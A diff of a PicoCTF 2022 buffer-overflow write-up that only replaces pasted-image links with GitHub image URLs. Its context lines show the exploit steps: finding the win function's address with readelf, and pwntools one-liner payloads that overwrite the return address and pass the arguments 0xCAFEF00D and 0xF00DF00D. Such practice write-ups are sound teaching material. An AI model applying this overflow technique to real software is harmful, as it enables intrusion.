@@ -2,7 +2,7 @@
 
 First we need to see if it is vulnerable to buffer overflows:
 
-![[Pasted image 20220316195746.png]]
+![image](https://github.com/MiguelCaputo/CTFs-writeups/blob/main/PicoCTF%202022/Images/bo21.png)
 
 We are, from the source code we can see that we need to get to the function "win" so we can find its address like:
 
@@ -12,7 +12,7 @@ readelf -s vuln
 
 This returns:
 
-![[Pasted image 20220316195949.png]]
+![image](https://github.com/MiguelCaputo/CTFs-writeups/blob/main/PicoCTF%202022/Images/bo22.png)
 
 The address is: 0x08049296
 
@@ -31,7 +31,7 @@ We can try this payload:
 python2 -c "from pwn import *; print 'A' * 112 + '\x96\x92\x04\x08'" | ./vuln
 ```
 
-![[Pasted image 20220316200212.png]]
+![image](https://github.com/MiguelCaputo/CTFs-writeups/blob/main/PicoCTF%202022/Images/bo23.png)
 
 This is good, we are reaching the **win** function, we just need to modify the parameters, we first create a "flag.txt" dummy file and continue testing.
 
@@ -43,7 +43,7 @@ The payload would look like:
 python2 -c "from pwn import *; print 'A' * 112 + '\x96\x92\x04\x08' + 'AAAA' + p32(0xCAFEF00D) + p32(0xF00DF00D)  " | ./vuln
 ```
 
-![[Pasted image 20220316200609.png]]
+![image](https://github.com/MiguelCaputo/CTFs-writeups/blob/main/PicoCTF%202022/Images/bo24.png)
 
 ## Flag
 
